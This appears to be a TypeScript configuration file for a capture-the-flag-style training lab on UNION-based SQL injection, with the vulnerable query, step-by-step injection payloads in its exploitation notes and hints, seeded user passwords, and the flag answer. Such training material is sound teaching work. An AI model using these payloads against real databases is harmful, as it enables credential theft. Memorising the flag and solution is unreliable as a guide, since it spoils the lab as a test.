import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab2Metadata: LabMetadata = {
  // ─── Identity ──────────────────────────────────────────────────────
  slug: 'sqli-union-extraction',
  title: 'SQL Injection: UNION-Based Data Extraction',
  ar_title: 'حقن SQL: استخراج البيانات بـ UNION',
  description:
    "You infiltrated CyberCorp's internal support portal. The user directory search is vulnerable to UNION-based SQLi. Extract the hidden admin credentials.",
  ar_description:
    'اخترقت بوابة الدعم الداخلية. البحث عن المستخدمين يحتوي على ثغرة UNION SQLi. استخرج بيانات الأدمن المخفية.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'SQL Injection',
    'UNION Attack',
    'Column Enumeration',
    'Data Extraction',
  ],
  xpReward: 200,
  pointsReward: 100,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── Pedagogy ──────────────────────────────────────────────────────
  goal: 'Use UNION-based SQL injection to extract the admin password from the user directory search.',
  scenario: {
    context:
      "CyberCorp's internal support portal has a 'User Directory' feature used by support analysts. " +
      'The backend builds a raw SQL query selecting only username, email, and role. ' +
      "The admin account's password is never shown in normal results — but it is retrievable via UNION injection.",
    vulnerableCode:
      'SELECT username, email, role FROM "LabGenericUser"\n' +
      "WHERE userId='...' AND labId='...' AND username ILIKE '%SEARCH_TERM%'",
    exploitation:
      "Step 1 — Confirm column count: ' ORDER BY 3--\n" +
      "Step 2 — Confirm types: ' UNION SELECT NULL,NULL,NULL--\n" +
      "Step 3 — Extract password into email column: ' UNION SELECT username, password, role FROM \"LabGenericUser\" WHERE username='admin'--",
  },
  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        "The query selects 3 columns (username, email, role). A UNION must return exactly 3 columns. Confirm with: ' ORDER BY 3--",
    },
    {
      order: 2,
      xpCost: 20,
      content:
        "Verify type compatibility: ' UNION SELECT NULL,NULL,NULL-- (no change in behavior = types are compatible).",
    },
    {
      order: 3,
      xpCost: 30,
      content:
        "The 'password' column exists in LabGenericUser but is not selected originally. Pivot it into the email column position in your UNION.",
    },
    {
      order: 4,
      xpCost: 50,
      content:
        "Full payload: ' UNION SELECT username, password, role FROM \"LabGenericUser\" WHERE username='admin'--",
    },
  ],

  // ─── Seed ──────────────────────────────────────────────────────────
  flagAnswer: 'FLAG{SQLI_UNION_DATA_EXTRACTED}',
  initialState: {
    users: [
      {
        username: 'alice',
        email: 'alice@cybercorp.io',
        role: 'analyst',
        password: 'alice_cc1_pass',
      },
      {
        username: 'bob',
        email: 'bob@cybercorp.io',
        role: 'analyst',
        password: 'bob_cc2_pass',
      },
      {
        username: 'charlie',
        email: 'charlie@cybercorp.io',
        role: 'analyst',
        password: 'charlie_cc3',
      },
      {
        username: 'support',
        email: 'support@cybercorp.io',
        role: 'support',
        password: 'sup_cc4_pass',
      },
      {
        username: 'admin',
        email: 'admin@cybercorp.io',
        role: 'admin',
        password: 'FLAG{SQLI_UNION_DATA_EXTRACTED}',
      },
    ],
  },
};
